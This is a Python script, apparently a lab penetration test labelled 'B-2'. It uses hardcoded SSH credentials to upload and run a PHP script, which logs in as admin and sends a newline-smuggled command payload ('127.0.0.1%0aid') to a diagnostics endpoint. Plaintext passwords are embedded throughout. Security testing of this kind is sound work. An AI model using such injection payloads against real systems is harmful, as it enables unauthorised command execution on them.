"""Test B-2 command injection through web endpoint with auth."""
import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('192.168.120.10', username='gdadmin', password='Gdadmin@123', timeout=30)

php_web_test = '''<?php
// Step 1: Login
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://localhost/auth/login');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username=admin&password=admin123');
curl_setopt($ch, CURLOPT_HTTPHEADER, ['X-Requested-With: XMLHttpRequest']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
$response = curl_exec($ch);
curl_close($ch);

// Extract PHPSESSID without preg_match
$session = '';
foreach (explode("\\n", $response) as $line) {
    if (stripos($line, 'Set-Cookie:') !== false && stripos($line, 'PHPSESSID') !== false) {
        $start = strpos($line, 'PHPSESSID=') + 10;
        $end = strpos($line, ';', $start);
        $session = $end ? substr($line, $start, $end - $start) : substr($line, $start);
        break;
    }
}
echo "Session: [" . $session . "]\\n";

if (empty(trim($session))) {
    echo "FAILED to get session!\\n";
    echo "Response headers:\\n";
    foreach (explode("\\n", $response) as $line) {
        if (trim($line)) echo "  " . $line . "\\n";
    }
    exit(1);
}

// Step 2: Test command injection with literal %0a in POST body
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://localhost/admin/diag/execute');
curl_setopt($ch, CURLOPT_POST, true);
// Send literal %0a — PHP URL-decodes to actual newline
curl_setopt($ch, CURLOPT_POSTFIELDS, 'target=127.0.0.1%0aid');
curl_setopt($ch, CURLOPT_HTTPHEADER, ['X-Requested-With: XMLHttpRequest']);
curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID=' . $session);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);

echo "Diag Result: " . $result . "\\n";

$data = json_decode($result, true);
if ($data) {
    echo "Success: " . ($data['success'] ? 'true' : 'false') . "\\n";
    echo "Output:\\n" . ($data['output'] ?? '(none)') . "\\n";
}
'''

sftp = ssh.open_sftp()
fh = sftp.open('/home/gdadmin/test_web_diag.php', 'w')
fh.write(php_web_test)
fh.close()
sftp.close()

stdin, stdout, stderr = ssh.exec_command('php /home/gdadmin/test_web_diag.php 2>&1', timeout=20)
out = stdout.read().decode('utf-8', errors='replace')
err = stderr.read().decode('utf-8', errors='replace')
print(out[:3000])
if err.strip():
    print(f'[stderr] {err.strip()[:500]}')

ssh.close()
